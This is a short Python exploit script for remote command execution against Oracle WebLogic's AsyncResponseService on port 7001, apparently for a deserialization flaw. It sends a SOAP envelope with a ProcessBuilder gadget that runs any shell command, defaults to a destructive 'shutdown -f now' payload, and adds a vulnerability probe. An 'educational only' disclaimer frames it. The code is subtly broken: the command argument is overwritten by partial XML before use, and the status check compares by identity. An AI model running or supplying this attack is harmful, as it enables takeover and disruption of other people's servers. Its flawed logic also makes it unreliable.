#!/usr/bin/python
# Author: Brad Roberts

# This is for educational purposes only. I made this for my own educational purposes. Feel free to improve upon it (prolly not hard)
# but I do NOT condone in any way the use of this program for malicious purposes.

# Took part of an exploit from online the week this vulnerability was released and decided to improve upon
# it for my own gain... nothing super special but taught me a ton.
# also played around with "safe" detection techniques but liked the metasploit one the best.

import requests

def exploit(target:str, os: str, payload: str):

	if os == "windows":
		environment = "cmd"
		param = "/c"
	elif os == "linux":
		environment = "/bin/sh"
		param = "-c"
	else:
		print("Enter either \"linux\" or \"windows\"")
		exit(-1)

	payload ="<soapenv:Envelope "
	payload +="    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\""
	payload +="    xmlns:wsa=\"http://www.w3.org/2005/08/addressing\""
	payload +="    xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">"
	payload +="        <soapenv:Header>" 
	payload +="        <wsa:Action>xy</wsa:Action>" 
	payload +="            <wsa:RelatesTo>xy</wsa:RelatesTo>"    
	payload +="            <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">"
	payload +="                <void class=\"java.lang.ProcessBuilder\">"  # start a new java process which is defined below
	payload +="                    <array class=\"java.lang.String\" length=\"3\">"               
	payload +="                        <void index=\"0\">"   
	payload +="                            <string>%s</string>" % (environment) # Environment
	payload +="                        </void>"             
	payload +="                        <void index=\"1\">"                        
	payload +="                            <string>%s</string>" % (param) # Parameters
	payload +="                        </void>"
	payload +="                        <void index=\"2\">"              
	payload +="                            <string>%s</string>" % (payload) # Exploit code
	payload +="                        </void>"
	payload +="                    </array>"        
	payload +="                <void method=\"start\"/></void>"  # start the process
	payload +="            </work:WorkContext>"
	payload +="    </soapenv:Header>"
	payload +="    <soapenv:Body>"
	payload +="        <asy:onAsyncDelivery/>"
	payload +="    </soapenv:Body>"
	payload +="</soapenv:Envelope>"

	uri = "http://{}:7001/_async/AsyncResponseService".format(target)
	request_header = {"Content-Type":"text/xml"}

	try:
		response = requests.post(uri, 
							headers=request_header, 
							data=payload, 
							verify=False)
		print("status_code: %s" % str(response.status_code))
		exit(0)
	except:
		print("Failed to make any connection.")
		exit(-1)


def check_vuln(target: str):
	uri = "http://{}:7001/_async/AsyncResponseService".format(target)
	request_header = {"SOAPAction":""}
	try:
		response = requests.post(url=uri, headers=request_header)

		if response.status_code is 500:
			print("Target likely vulnerable.")
		else:
			print("Target likely NOT vulnerable.")
		exit(0)
	except:
		print("Failed to make any connection.")
		exit(-1)


target = "127.0.0.1"
os = "linux"
payload = "shutdown -f now"

# exploit(target, os, payload)
# check_vuln(target)
